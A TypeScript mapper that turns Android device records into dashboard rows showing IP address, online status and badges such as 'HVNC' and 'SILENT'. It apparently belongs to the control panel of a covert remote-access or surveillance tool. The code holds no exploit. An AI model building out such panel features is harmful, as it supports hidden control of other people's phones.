import type { Device } from '@/types';
import type { Cliente } from '@/types/dashboard';

function computeLatencyMs(isOnline: boolean, lastActivityAt?: string | null): number {
  if (!isOnline || !lastActivityAt) return 0;
  const ts = new Date(lastActivityAt).getTime();
  if (Number.isNaN(ts)) return 0;
  return Math.max(0, Date.now() - ts);
}

function buildModelName(device: Device): string {
  const parts = [device.manufacturer, device.model]
    .map((v) => v?.trim())
    .filter(Boolean);
  if (parts.length > 0) {
    return parts.join(' ').toUpperCase();
  }
  return device.device_id.slice(0, 8).toUpperCase();
}

export function mapDeviceToCliente(device: Device): Cliente {
  const badges: string[] = [];
  const isOnline = device.is_online;

  if (isOnline && device.has_screen) {
    badges.push('VNC');
  }
  if (device.silent_active || device.capture_method === 'silent') {
    badges.push('SILENT');
  }
  if (isOnline && device.capture_method && device.capture_method !== 'silent') {
    badges.push('HVNC');
  }
  if (isOnline && badges.length === 0) {
    badges.push('IDLE');
  }

  const tag =
    device.model?.trim() ||
    device.manufacturer?.trim() ||
    device.device_id.slice(0, 12);

  const androidVersion = device.android_version
    ? `Android ${device.android_version}`
    : '—';

  const lastActivityAt = device.last_activity_at ?? undefined;

  return {
    id: String(device.id),
    deviceId: device.device_id,
    status: isOnline ? 'online' : 'offline',
    tag,
    country: '—',
    carrier: '—',
    ip: device.ip_address?.trim() || '—',
    android: androidVersion,
    badges,
    model: device.model || 'Dispositivo',
    manufacturer: device.manufacturer || '—',
    lastSeen: device.last_seen,
    lastActivityAt,
    latencyMs: computeLatencyMs(isOnline, lastActivityAt),
    modelName: buildModelName(device),
    androidVersion,
  };
}
